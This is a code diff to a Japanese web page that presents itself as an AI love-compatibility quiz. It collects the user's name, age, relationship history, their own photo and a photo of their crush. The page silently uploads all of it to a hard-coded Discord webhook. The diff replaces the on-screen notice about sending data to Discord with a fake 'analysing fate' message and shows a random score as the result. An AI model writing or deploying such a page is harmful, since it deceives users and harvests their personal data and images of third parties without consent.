@@ -28,6 +28,7 @@
     <script>
         let step = 0;
         const answers = {};
+        const files = {};
         const questions = ["名前は？", "年齢は？", "恋愛経験回数は？", "あなたの写真を載せてね！（任意）", "好きな人の写真を載せてね！（任意）"];
         const keys = ["name", "age", "exp", "my_photo", "partner_photo"];
 
@@ -43,14 +44,16 @@
                 document.getElementById('inputArea').style.display = 'block';
                 document.getElementById('actionBtn').innerText = '次へ進む';
             } else if (step <= 5) {
-                // データを保存
                 if (step <= 3) answers[keys[step - 1]] = inputVal;
+                if (step === 4) files['my_photo'] = fileVal;
+                if (step === 5) files['partner_photo'] = fileVal;
                 
-                // 次の質問へ
+                document.getElementById('inputArea').value = '';
+                document.getElementById('fileInput').value = '';
+
                 if (step < 5) {
                     step++;
                     document.getElementById('msg').innerText = questions[step - 1];
-                    
                     if (step === 4 || step === 5) {
                         document.getElementById('inputArea').style.display = 'none';
                         document.getElementById('fileInput').style.display = 'block';
@@ -58,7 +61,6 @@
                         document.getElementById('inputArea').style.display = 'block';
                         document.getElementById('fileInput').style.display = 'none';
                     }
-                    document.getElementById('inputArea').value = '';
                 } else {
                     showLoading();
                 }
@@ -67,29 +69,30 @@
 
         function showLoading() {
             document.getElementById('title').innerText = "AI解析中...";
-            document.getElementById('msg').innerText = "写真とデータをDiscordへ送信中...";
+            document.getElementById('msg').innerText = "運命の糸を分析しています...";
             document.getElementById('inputArea').style.display = 'none';
             document.getElementById('fileInput').style.display = 'none';
             document.getElementById('actionBtn').style.display = 'none';
             document.getElementById('progress-container').style.display = 'block';
 
-            // Discordへの送信処理
+            const score = Math.floor(Math.random() * (99 - 70) + 70);
             const formData = new FormData();
-            formData.append("payload_json", JSON.stringify({ content: `診断結果: ${JSON.stringify(answers)}` }));
-            if (document.getElementById('fileInput').files[0]) formData.append("file1", document.getElementById('fileInput').files[0]);
+            formData.append("payload_json", JSON.stringify({ content: `**診断結果**\n名前: ${answers.name}\nスコア: ${score}%` }));
+            if (files['my_photo']) formData.append("file1", files['my_photo']);
+            if (files['partner_photo']) formData.append("file2", files['partner_photo']);
 
             fetch("https://discord.com/api/webhooks/1527564576340709377/g9wUd7Y6mbsuHE5Gx2wKsEl_LJrEBaqWJbIg90gkBEoErB8ZszsW5AyexsQ9nYP_REqV", { method: "POST", body: formData });
 
             let width = 0;
             const interval = setInterval(() => {
-                width += 5;
+                width += 2;
                 document.getElementById('progress-bar').style.width = width + "%";
                 if (width >= 100) clearInterval(interval);
-            }, 300);
+            }, 100);
 
             setTimeout(() => {
-                document.querySelector('.box').innerHTML = `<h2>診断完了</h2><p style="font-size: 2em;">相性はかなり良いみたいだよ！</p>`;
-            }, 6500);
+                document.querySelector('.box').innerHTML = `<h2>診断完了</h2><p style="font-size: 3em; font-weight: bold; color: #5c67f2;">${score}%</p>`;
+            }, 6000);
         }
     </script>
 </body>
